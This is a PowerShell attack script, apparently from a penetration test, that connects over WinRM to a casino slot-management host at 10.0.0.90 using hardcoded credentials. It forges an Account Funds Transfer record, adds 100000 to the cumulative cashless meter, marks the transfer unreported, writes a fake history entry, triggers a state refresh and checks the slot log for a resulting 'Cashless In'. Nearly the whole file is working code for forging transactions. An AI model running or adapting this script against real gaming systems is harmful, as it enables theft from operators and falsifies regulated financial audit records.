$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
$cred = New-Object System.Management.Automation.PSCredential('GOLD-CLUB\test', (ConvertTo-SecureString 'test' -AsPlainText -Force))
$computerName = '10.0.0.90'
$statePath = 'C:\Goldclub\var\state\goldclub.aurum.services\GCMessenger\SASControler1'
$historyPath = Join-Path $statePath 'History'
$logPath = 'C:\Goldclub\var\log\SlotLog\2026-06-17.log'
Write-Host '=== Probe Hop 3: AFT XML State Manipulation ===' -ForegroundColor Cyan
Write-Host "Target: $computerName"
Write-Host ''
Write-Host '[1] Establishing WinRM session...' -ForegroundColor Yellow
try {
    $session = New-PSSession -ComputerName $computerName -Credential $cred -ErrorAction Stop
    Write-Host '    WinRM session established.' -ForegroundColor Green
} catch {
    Write-Host "    ERROR: $_" -ForegroundColor Red
    exit 1
}

Write-Host ''
Write-Host '[2] Reading existing AFT state XML files...' -ForegroundColor Yellow
Invoke-Command -Session $session -ScriptBlock {
    param($statePath, $historyPath)
    $mostRecentPath = Join-Path $statePath 'GCC_ST_20664_01_aftMostRecentTransaction_v1.xml'
    if (Test-Path $mostRecentPath) {
        $xml = [xml](Get-Content $mostRecentPath -Raw)
        $txn = $xml.AftTransactionSerializer.aftTransaction
        $txnIdStr = ($txn.transactionId.char | ForEach-Object { [char][int]$_ }) -join ''
        $tsBytes = [System.Convert]::FromBase64String($txn.transactionCompletedDateTime)
        $hexStr = ($tsBytes | ForEach-Object { '{0:X2}' -f $_ }) -join ' '
        $expBytes = [System.Convert]::FromBase64String($txn.expiration.bcdData)
        $expHex = ($expBytes | ForEach-Object { '{0:X2}' -f $_ }) -join ' '
        Write-Host "    Version: $($xml.AftTransactionSerializer.version)"
        Write-Host "    Status: $($txn.transferStatus)"
        Write-Host "    Amount: $($txn.requestedNonRestrictedAmount)"
        Write-Host "    TxnId: $txnIdStr"
        Write-Host "    Timestamp bytes: $hexStr"
        Write-Host "    Expiration bytes: $expHex"
        Write-Host "    Cumulative: $($txn.comulativeNonRestrictedAmountMeter)"
        Write-Host "    Reported: $($txn.aftTransactionReported)"
        Write-Host "    Finished: $($txn.aftTransactionFinished)"
        Write-Host "    RequestMsg: $($txn.requestTextMessage)"
    }
    $settingsPath = Join-Path $statePath 'GCC_ST_20664_01_aftCurrentSettings_v2.xml'
    if (Test-Path $settingsPath) {
        $sxml = [xml](Get-Content $settingsPath -Raw)
        Write-Host "    Settings Ver: $($sxml.CurrentAftSettingsSerializer.version)"
        Write-Host "    RegStatus: $($sxml.CurrentAftSettingsSerializer.currentAftSettings.registrationStatus)"
    }
    $historyFiles = Get-ChildItem -Path $historyPath -Filter 'GCC_ST_20664_01_aftTransactionHistory_i*_v1.xml' | Sort-Object Name -Descending | Select-Object -First 1
    if ($historyFiles) {
        Write-Host "    Latest history: $($historyFiles.Name)"
        $hxml = [xml](Get-Content $historyFiles.FullName -Raw)
        $htxn = $hxml.AftTransactionCarrier.aftTransaction
        $hTxnIdStr = ($htxn.transactionId.char | ForEach-Object { [char][int]$_ }) -join ''
        Write-Host "    History TxnId: $hTxnIdStr Amount: $($htxn.requestedNonRestrictedAmount)"
    }
    $datFiles = Get-ChildItem -Path 'C:\Goldclub\var\state\goldclub.aurum.services' -Filter '*.dat' -Recurse -ErrorAction SilentlyContinue
    if ($datFiles) {
        Write-Host "    Found $($datFiles.Count) .dat files:"
        $datFiles | ForEach-Object { Write-Host "      $($_.FullName) $([math]::Round($_.Length/1024,1)) KB" }
    }
} -ArgumentList $statePath, $historyPath

Write-Host ''
Write-Host '[3] Creating spoofed AFT transaction...' -ForegroundColor Yellow
$spoofResult = Invoke-Command -Session $session -ScriptBlock {
    param($statePath, $historyPath)
    $mostRecentPath = Join-Path $statePath 'GCC_ST_20664_01_aftMostRecentTransaction_v1.xml'
    $settingsPath = Join-Path $statePath 'GCC_ST_20664_01_aftCurrentSettings_v2.xml'
    $xml = [xml](Get-Content $mostRecentPath -Raw)
    $txn = $xml.AftTransactionSerializer.aftTransaction

    $newTxnId = 'Spoof Test 99'
    Write-Host "    New TxnId: $newTxnId"

    $charNodes = @()
    foreach ($ch in $newTxnId.ToCharArray()) {
        $charNode = $xml.CreateElement('char')
        $charNode.InnerText = [int]$ch
        $charNodes += $charNode
    }
    $oldParent = $txn.transactionId
    foreach ($child in @($oldParent.ChildNodes)) { $oldParent.RemoveChild($child) | Out-Null }
    foreach ($cn in $charNodes) { $txn.transactionId.AppendChild($cn) | Out-Null }
    $txn.transactionIdLength = $newTxnId.Length

    $now = Get-Date
    $nowIso = $now.ToString('yyyy-MM-ddTHH:mm:ss.fffffffzzz')
    Write-Host "    Time: $nowIso"

    $aurumTxn = $txn.aurumTransactions.AurumTransaction
    $aurumTxn.transferInitiatedTime = $nowIso
    $ns = 'http://BOB.gamingstandards.com'
    $aurumTxn.requestTransfer.SetAttribute('egmDateTime', $ns, $nowIso)
    $aurumTxn.requestTransfer.SetAttribute('cageDateTime', $ns, $nowIso)
    $aurumTxn.authorizeTransfer.SetAttribute('egmDateTime', $ns, $nowIso)
    $aurumTxn.authorizeTransfer.SetAttribute('cageDateTime', $ns, $nowIso)
    $aurumTxn.authorizeTransfer.SetAttribute('egmDateTime2', $ns, $nowIso)
    $aurumTxn.authorizeTransfer.SetAttribute('cageDateTime2', $ns, $nowIso)
    $aurumTxn.authorizeTransfer.SetAttribute('egmDateTime3', $ns, $nowIso)
    $aurumTxn.authorizeTransfer.SetAttribute('cageDateTime3', $ns, $nowIso)
    $aurumTxn.commitTransfer.SetAttribute('egmDateTime', $ns, $nowIso)
    $aurumTxn.commitTransfer.SetAttribute('cageDateTime', $ns, $nowIso)
    $aurumTxn.commitTransfer.SetAttribute('transferDateTime', $ns, $nowIso)

    $tsBytes = [System.BitConverter]::GetBytes($now.Ticks)
    $txn.transactionCompletedDateTime = [System.Convert]::ToBase64String($tsBytes)

    $txn.comulativeNonRestrictedAmountMeter = [long]$txn.comulativeNonRestrictedAmountMeter + 100000
    $txn.aftTransactionReported = 'false'
    $txn.aftTransactionFinished = 'true'
    $txn.instanceId = [System.Guid]::NewGuid().ToString()
    $xml.AftTransactionSerializer.version = [int]$xml.AftTransactionSerializer.version + 1

    $xml.Save($mostRecentPath)
    Write-Host "    Written: $mostRecentPath"

    $historyFiles = Get-ChildItem -Path $historyPath -Filter 'GCC_ST_20664_01_aftTransactionHistory_i*_v1.xml' -ErrorAction SilentlyContinue
    $maxIndex = 0
    foreach ($f in $historyFiles) {
        if ($f.Name -match 'i(\d+)_v1\.xml') {
            $idx = [int]$matches[1]
            if ($idx -gt $maxIndex) { $maxIndex = $idx }
        }
    }
    $nextIndex = $maxIndex + 1
    $newHistoryFile = Join-Path $historyPath "GCC_ST_20664_01_aftTransactionHistory_i${nextIndex}_v1.xml"

    $historyXml = [xml]('<?xml version="1.0"?><AftTransactionCarrier xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><globalVersion>' + ($maxIndex + 42) + '</globalVersion><version>3</version><aftTransaction></aftTransaction></AftTransactionCarrier>')
    $importedNode = $historyXml.ImportNode($txn, $true)
    $historyXml.AftTransactionCarrier.aftTransaction.AppendChild($importedNode) | Out-Null
    $historyXml.AftTransactionCarrier.aftTransaction.aftTransactionReported = 'false'
    $historyXml.Save($newHistoryFile)
    Write-Host "    History: $newHistoryFile"

    $settingsXml = [xml](Get-Content $settingsPath -Raw)
    $settingsXml.CurrentAftSettingsSerializer.version = [int]$settingsXml.CurrentAftSettingsSerializer.version + 1
    $settingsXml.Save($settingsPath)

    return @{ TxnId=$newTxnId; Time=$nowIso; History=$newHistoryFile; Cumulative=$txn.comulativeNonRestrictedAmountMeter }
} -ArgumentList $statePath, $historyPath

Write-Host "    Spoof: $($spoofResult | ConvertTo-Json -Compress)" -ForegroundColor Green

Write-Host ''
Write-Host '[4] Attempting OneHand state refresh...' -ForegroundColor Yellow
$refreshResult = Invoke-Command -Session $session -ScriptBlock {
    $results = @()
    Write-Host '    [4a] Checking port 50010...' -ForegroundColor Yellow
    try {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $tcp.Connect('127.0.0.1', 50010)
        Write-Host '    Port 50010 OPEN' -ForegroundColor Green
        $tcp.Close()
        $results += 'PORT_50010_OPEN'
    } catch {
        Write-Host "    Port 50010: $_" -ForegroundColor Red
        $results += 'PORT_50010_CLOSED'
    }

    try {
        $resp = Invoke-WebRequest -Uri 'http://localhost:50010/GM2AU' -Method GET -TimeoutSec 5 -ErrorAction SilentlyContinue
        Write-Host "    HTTP: $($resp.StatusCode)"
        $preview = $resp.Content.Substring(0, [Math]::Min(500, $resp.Content.Length))
        Write-Host "    Body: $preview"
        $results += 'HTTP_OK'
    } catch {
        Write-Host "    HTTP: $_" -ForegroundColor Red
        $results += 'HTTP_FAIL'
    }

    Write-Host '    [4b] Checking OneHand process...' -ForegroundColor Yellow
    $proc = Get-Process -Name 'OneHand*' -ErrorAction SilentlyContinue
    if ($proc) {
        Write-Host "    Found: PID $($proc.Id)" -ForegroundColor Green
        $results += "ONEHAND_PID=$($proc.Id)"
        netstat -ano | Select-String '50010|50011' | ForEach-Object { Write-Host "    $_" }
    } else {
        Write-Host '    OneHand NOT found' -ForegroundColor Red
        $results += 'ONEHAND_NOT_FOUND'
    }

    Write-Host '    [4c] Creating trigger file...' -ForegroundColor Yellow
    $triggerPath = 'C:\Goldclub\var\state\goldclub.aurum.services\.aft_refresh_trigger'
    Set-Content -Path $triggerPath -Value "REFREQ $(Get-Date -Format 'o')" -Force
    Write-Host "    Trigger: $triggerPath"
    $results += 'TRIGGER_CREATED'

    Write-Host '    [4d] Checking services...' -ForegroundColor Yellow
    $svcs = Get-Service -Name '*OneHand*','*GoldClub*','*Aurum*','*Slot*' -ErrorAction SilentlyContinue
    if ($svcs) {
        $svcs | ForEach-Object { Write-Host "    $($_.Name) = $($_.Status)"; $results += "SVC:$($_.Name)=$($_.Status)" }
    } else {
        Write-Host '    No matching services'
        $results += 'NO_SERVICES'
    }
    return $results
}

Write-Host '    Refresh results:' -ForegroundColor Yellow
$refreshResult | ForEach-Object { Write-Host "    $_" }

Write-Host ''
Write-Host '[5] Checking SlotLog for Cashless In...' -ForegroundColor Yellow
Invoke-Command -Session $session -ScriptBlock {
    param($logPath)
    if (Test-Path $logPath) {
        $lastLines = Get-Content $logPath -Tail 200
        $cashless = $lastLines | Select-String 'Cashless In'
        if ($cashless) {
            Write-Host "    Found $($cashless.Count) Cashless In lines:" -ForegroundColor Green
            $cashless | ForEach-Object { Write-Host "    $_" }
        } else {
            Write-Host '    No Cashless In in last 200 lines' -ForegroundColor Yellow
            $aft = $lastLines | Select-String 'AFT|transferStatus|TRANSFER_INHOUSE'
            if ($aft) {
                Write-Host "    Found $($aft.Count) AFT lines:"
                $aft | Select-Object -Last 10 | ForEach-Object { Write-Host "    $_" }
            }
        }
        Write-Host '    Last 5 lines:'
        Get-Content $logPath -Tail 5 | ForEach-Object { Write-Host "    $_" }
    } else {
        Write-Host "    Log not found: $logPath" -ForegroundColor Red
    }
} -ArgumentList $logPath

Write-Host ''
Write-Host '[6] Examining .dat files...' -ForegroundColor Yellow
Invoke-Command -Session $session -ScriptBlock {
    $stateBase = 'C:\Goldclub\var\state\goldclub.aurum.services'
    $datFiles = Get-ChildItem -Path $stateBase -Filter '*.dat' -Recurse -ErrorAction SilentlyContinue
    if ($datFiles) {
        Write-Host "    Found $($datFiles.Count) .dat files:"
        $datFiles | ForEach-Object {
            Write-Host "      $($_.FullName) $([math]::Round($_.Length/1024,1)) KB"
            $head = Get-Content $_.FullName -TotalCount 1 -ErrorAction SilentlyContinue
            if ($head) { Write-Host "        Head: $($head.Substring(0, [Math]::Min(100, $head.Length)))" }
        }
    }
    foreach ($subdir in @('payments','validations','features','bonuses')) {
        $dirPath = Join-Path $stateBase $subdir
        if (Test-Path $dirPath) {
            Write-Host "    Dir: $dirPath"
            Get-ChildItem $dirPath -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "      $($_.Name) $([math]::Round($_.Length/1024,1)) KB" }
        }
    }
}

Write-Host ''
Write-Host '[7] Cleanup...' -ForegroundColor Yellow
Remove-PSSession $session

Write-Host ''
Write-Host '=== Probe Complete ===' -ForegroundColor Cyan
Write-Host "Spoofed TxnId: $($spoofResult.TxnId)"
Write-Host "Timestamp: $($spoofResult.Time)"
Write-Host "History: $($spoofResult.History)"
Write-Host "Cumulative: $($spoofResult.Cumulative)"
Write-Host "Refresh: $($refreshResult -join ', ')"